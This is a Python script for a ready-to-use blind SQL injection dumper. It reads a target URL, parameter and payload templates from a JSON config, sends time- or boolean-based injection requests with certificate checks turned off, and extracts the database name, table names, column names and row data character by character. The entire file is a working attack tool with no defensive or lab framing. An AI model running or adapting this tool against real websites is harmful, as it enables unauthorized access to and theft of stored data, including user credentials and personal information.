import requests
import string
import time
import json
import argparse
import urllib3

# Disable SSL verification warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-@."

class MultiDBBlindSQLiDumper:
    def __init__(self, config_path):
        self.load_config(config_path)

    def load_config(self, path):
        """Load target configuration, headers, and payloads from JSON file."""
        try:
            with open(path, 'r', encoding='utf-8') as f:
                self.config = json.load(f)
            
            self.target = self.config.get("target_url")
            self.method = self.config.get("method", "POST").upper()
            self.headers = self.config.get("headers", {})
            self.param = self.config.get("target_param")
            self.mode = self.config.get("injection_type", "time")
            self.threshold = self.config.get("time_threshold", 3.0)
            self.keyword = self.config.get("success_keyword", "")
            self.payload_template = self.config.get("payload_template", "1' AND ({query})-- -")
            self.queries = self.config.get("queries", {})
            
            print(f"[+] Configuration loaded successfully from '{path}'")
        except Exception as e:
            print(f"[-] Error loading config file: {e}")
            exit(1)

    def send_request(self, payload):
        """Send HTTP request to the target server."""
        if self.method == "POST":
            body = {self.param: payload}
            start_time = time.time()
            res = requests.post(self.target, json=body, headers=self.headers, timeout=10, verify=False)
            elapsed = time.time() - start_time
        else:
            params = {self.param: payload}
            start_time = time.time()
            res = requests.get(self.target, params=params, headers=self.headers, timeout=10, verify=False)
            elapsed = time.time() - start_time
            
        return res, elapsed

    def check_condition(self, sql_query):
        """Test SQL injection condition (Time-based or Boolean-based)."""
        full_sql_payload = self.payload_template.format(query=sql_query)
        
        try:
            response, elapsed = self.send_request(full_sql_payload)

            if self.mode == "time" and elapsed >= self.threshold:
                return True
            
            if self.mode == "boolean" and self.keyword in response.text:
                return True

        except Exception:
            pass
        return False

    def extract_string(self, query):
        """Extract data character-by-character using SUBSTRING/SUBSTR and ASCII matching."""
        extracted = ""
        for pos in range(1, 50):
            found = False
            for char in CHARSET:
                formatted_query = query.format(pos=pos, ascii_val=ord(char))
                
                if self.check_condition(formatted_query):
                    extracted += char
                    print(char, end="", flush=True)
                    found = True
                    break
            if not found:
                break
        return extracted

    def run(self):
        print("\n" + "="*50)
        print("   MULTI-DATABASE BLIND SQLI DUMPER   ")
        print("="*50)

        # 1. Extract Current Database
        print("[*] Extracting Current Database Name...")
        db_query = self.queries.get("get_db")
        current_db = self.extract_string(db_query)
        print(f"\n[+] Active Database: {current_db}")

        if not current_db:
            print("[-] Couldn't extract database name. Check your config file and payloads.")
            return

        # 2. Extract Tables
        print(f"\n[*] Extracting Tables from '{current_db}'...")
        tables = []
        tbl_template = self.queries.get("get_tables")
        
        for i in range(0, 15):
            tbl_query = tbl_template.format(db=current_db, offset=i, pos="{pos}", ascii_val="{ascii_val}")
            tbl = self.extract_string(tbl_query)
            if not tbl: break
            tables.append(tbl)
            print(f" -> Table: {tbl}")

        if not tables: return

        print("\n--- Available Tables ---")
        for idx, t in enumerate(tables):
            print(f"[{idx}] {t}")
        
        choice = int(input("\nSelect Table Index to Dump: "))
        selected_table = tables[choice]

        # 3. Extract Columns
        print(f"\n[*] Extracting Columns from '{selected_table}'...")
        columns = []
        col_template = self.queries.get("get_columns")
        
        for i in range(0, 15):
            col_query = col_template.format(db=current_db, table=selected_table, offset=i, pos="{pos}", ascii_val="{ascii_val}")
            col = self.extract_string(col_query)
            if not col: break
            columns.append(col)
            print(f" -> Column: {col}")

        print("\n--- Available Columns ---")
        for idx, c in enumerate(columns):
            print(f"[{idx}] {c}")
        
        cols_idx = input("\nEnter Column Indexes (e.g. 0,2): ")
        selected_cols = [columns[int(i.strip())] for i in cols_idx.split(",")]

        # 4. Dump Data
        print(f"\n[*] Dumping Data from '{selected_table}'...")
        dump_template = self.queries.get("dump_data")
        
        for i in range(0, 20):
            row = []
            for c in selected_cols:
                dump_query = dump_template.format(table=selected_table, column=c, offset=i, pos="{pos}", ascii_val="{ascii_val}")
                val = self.extract_string(dump_query)
                row.append(val if val else "NULL")
                print(" | ", end="")
            if all(v == "NULL" for v in row): break
            print(f"\n[Row {i}] -> {dict(zip(selected_cols, row))}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Multi-Database Blind SQL Injection Tool")
    parser.add_argument("-c", "--config", default="config_mysql.json", help="Path to config file (e.g., config_mysql.json)")
    args = parser.parse_args()

    dumper = MultiDBBlindSQLiDumper(args.config)
    dumper.run()
